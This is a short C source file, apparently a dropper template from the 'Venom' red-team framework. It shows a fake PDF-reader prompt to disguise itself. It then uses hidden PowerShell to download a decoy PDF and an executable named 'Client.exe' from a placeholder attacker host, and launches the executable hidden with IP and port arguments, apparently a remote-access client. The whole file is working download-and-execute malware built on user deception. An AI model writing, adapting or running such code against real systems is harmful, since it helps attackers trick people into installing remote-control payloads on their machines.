/*
Author: r00t-3xp10it (SSA RedTeam @2020)
Framework: Venom v1.0.17.4 - shinigami
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>


int main()
{
   MessageBox(NULL, "Open Archive with PDF Reader?", "Portable Document Format (PDF)", MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON1 | MB_SETFOREGROUND);
   system("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.pdf', 'TempDir\\FiLNaMe.pdf') && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\FiLNaMe.pdf'");Sleep(1);
   system("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/Client.exe', 'TempDir\\Client.exe') && powershell Start-Process -w 1 -FilePath 'TempDir\\Client.exe' -ArgumentList 'ip=LhOsT','port=LpOrT'");
   return 0;
}

